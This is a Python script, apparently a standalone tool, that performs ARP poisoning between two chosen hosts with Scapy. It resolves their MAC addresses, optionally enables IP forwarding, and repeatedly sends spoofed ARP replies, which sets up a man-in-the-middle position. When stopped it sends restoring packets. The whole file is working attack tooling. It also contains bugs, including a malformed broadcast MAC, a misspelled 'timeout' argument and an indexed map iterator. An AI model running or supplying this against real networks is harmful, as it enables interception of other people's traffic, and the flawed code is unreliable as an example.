
from scapy.layers.l2 import Ether, ARP

try:
    from logging import getLogger, ERROR

    getLogger('scapy.runtime').setLevel(ERROR)  # Scapy logging
    from scapy.all import *

    conf.verb = 0  # Scapy verbosity
except ImportError:
    print("Scapy is not installed. Please install it and try again.")
    sys.exit(1)


class PreAttack(object):  # Function to be called before the attack
    def __init__(self, target, interface):
        self.target = target
        self.interface = interface

    def get_MAC_Addr(self):  # Get MAC address of target
        return srp(Ether(dst='ff::ff::ff::ff::ff::ff') / ARP(pdst=self.target)
                   , timout=10, iface=self.interface)[0][0][1][ARP].hwsrc

    class toggle_IP_Forward(object):  # Toggle IP forwarding
        def __init__(self, path="/proc/sys/net/ipv4/ip_forward"):  # Initialize the class
            self.path = path

        def enable_IP_Forward(self):
            with open(self.path, "wb") as file:  # Enable IP forwarding
                file.write('1'.encode())  # 1 = Enable
            return 1

        def disable_IP_Forward(self):  # Disable IP forwarding
            with open(self.path, "wb") as file:
                file.write('0'.encode())
            return 0


class Attack(object):  # Function to be called after the attack
    def __init__(self, target, interface):
        self.target1 = target[0]
        self.target2 = target[1]
        self.interface = interface

    def send_posion(self, MACS):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACS[0]),
             iface=self.interface)  # Send ARP posion packet to target1
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACS[1]),
             iface=self.interface)  # Send ARP posion packet to target2

    def send_fix(self, MACS):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACS[0]),
             iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=MACS[1]),
             iface=self.interface)


if __name__ == '__main__':
    import sys
    import argparse
    from datetime import datetime
    from time import sleep as pause

    parser = argparse.ArgumentParser(description='ARP poisoning attack')  # Create argument parser
    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface',
                        default=False)  # Network interface to attack on
    parser.add_argument('-t1', '--target1', help='Target 1 to attack', action='store', dest='target1',
                        default=False)  # Target 1 to attack
    parser.add_argument('-t2', '--target2', help='Target 2 to attack', action='store', dest='target2',
                        default=False)  # Target 2 to attack
    parser.add_argument('-f', '--forward', help='Enable IP forwarding', action='store_true', dest='forward',
                        default=False)  # Enable IP forwarding
    parser.add_argument('-q', '--quiet', help='Quiet mode', action='store_true', dest='quiet',
                        default=False)  # Disable feedback messages
    parser.add_argument('--clock', help='Track attack duration', action='store_true', dest='time',
                        default=False)  # Track attack duration
    args = parser.parse_args()  # Parse arguments
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    elif (not args.target1) or not args.target2:  # Check if target is specified
        parser.error("You must specify at least one target and enable IP forwarding")
        sys.exit(1)

    elif not args.interface:
        parser.error("You must specify a network interface")
        sys.exit(1)

    start_time = datetime.now()  # Start time of attack
    targets = [args.target1, args.target2]  # Targets to attack
    print('Attacking {} and {}'.format(args.target1, args.target2))  # Print attacking targets
    try:
        MACS = map(lambda x: PreAttack(x, args.interface).get_MAC_Addr(), targets)  # Get MAC addresses of targets
        print('DONE')
    except Exception:
        print('FAILED')
        sys.exit(1)

    try:
        if args.forward:
            print('Enabling IP forwarding')
            PreAttack.toggle_IP_Forward().enable_IP_Forward()  # Enable IP forwarding
            print('Sending poison packets')

    except IOError:
        print('FAILED')
        try:
            choice = input(
                'Do you want to enable IP forwarding? [y/n] ')  # Ask user if they want to enable IP forwarding
            if choice == 'y':
                pass
            elif choice == 'n':
                print('Exiting...')
                sys.exit(1)
            else:
                print('Invalid choice')
                sys.exit(1)

        except KeyboardInterrupt:
            sys.exit(1)

    while 1:
        try:
            try:
                Attack(targets, args.interface).send_posion(MACS)  # Send ARP posion packets to targets
            except Exception:
                print('FAILED')
                sys.exit(1)
            if not args.quiet:
                print('Sending poison packets')
            else:
                pass
            pause(2.5)

        except KeyboardInterrupt:
            break

    print("fixing Targets")
    for i in range(0, 16):
        try:
            Attack(targets, args.interface).send_fix(MACS)  # Send ARP posion packets to targets
        except (Exception, KeyboardInterrupt):
            print('FAILED')
            sys.exit(1)
        pause(2)
    print('DONE')
    try:
        if args.forward:
            print('Disabling IP forwarding')
            PreAttack.toggle_IP_Forward().disable_IP_Forward()
            print('Exiting...')
    except IOError:
        print("FAIL")

    if args.time:
        print('Attack duration: {}'.format(datetime.now() - start_time))


